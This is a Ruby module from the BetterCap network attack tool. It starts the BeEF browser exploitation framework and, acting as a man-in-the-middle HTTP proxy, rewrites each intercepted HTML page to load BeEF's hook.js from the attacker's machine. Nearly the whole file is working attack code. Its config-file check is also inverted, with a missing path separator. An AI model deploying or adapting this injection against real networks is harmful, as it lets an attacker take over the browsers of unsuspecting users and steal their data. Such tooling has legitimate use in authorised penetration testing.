=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/

This project is released under the GPL 3 license.

=end

# Handle BeEF framework execution and injection into
# html pages automagically.
class BeefBox < BetterCap::Proxy::HTTP::Module
  meta(
    'Name'        => 'BeefBox',
    'Description' => 'Handle BeEF framework execution and injection into html pages automagically.',
    'Version'     => '1.0.0',
    'Author'      => "Simone 'evilsocket' Margaritelli",
    'License'     => 'GPL3'
  )

  @@beefpath = nil

  def self.on_options(opts)
    opts.on( '--beef-path PATH', 'Path to the BeEF installation.' ) do |v|
      @@beefpath = File.expand_path v
      unless Dir.exists?(@@beefpath) and File.exists?(@@beefpath + '/beef')
        raise BetterCap::Error, "#{@@beefpath} invalid BeEF installation path."
      end
    end
  end

  def initialize
    @beefport = 3000
    @beefpid  = nil
    @hookname = '/hook.js'

    while !beef_path_valid?
      print '[BEEFBOX] Please specify the BeEF installation path: '.yellow
      @@beefpath = gets.chomp
    end

    # read BeEF's config.yaml
    unless Dir.exists?(@@beefpath) and File.exists?(@@beefpath + 'config.yaml')
      begin
        require 'yaml'
        raw = File.read(@@beefpath + '/config.yaml')
        cfg = YAML.load(raw)
        @beefport = cfg['beef']['http']['port'].to_i
        @hookname = cfg['beef']['http']['hook_file']
      rescue
        BetterCap::Logger.warn "[BEEFBOX] Could not parse BeEF config file. Using defaults."
      end
    end

    @jsfile = "http://#{BetterCap::Context.get.iface.ip}:#{@beefport}#{@hookname}"

    BetterCap::Logger.warn "[BEEFBOX] Starting BeEF ..."
    BetterCap::Logger.info "[BEEFBOX] Using hook: #{@jsfile}"

    @beefpid = fork do
      exec "cd '#{@@beefpath}' && ./beef"
    end
  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      BetterCap::Logger.warn "Injecting BeEF into http://#{request.host}#{request.path}"

      response.body.sub!( '</title>', "</title><script src='#{@jsfile}' type='text/javascript'></script>" )
    end
  end

  private

  def beef_path_valid?
    unless @@beefpath.nil?
      @@beefpath = File.expand_path @@beefpath
      if Dir.exists? @@beefpath
        return File.exists? @@beefpath + '/beef'
      end
    end
    false
  end
end
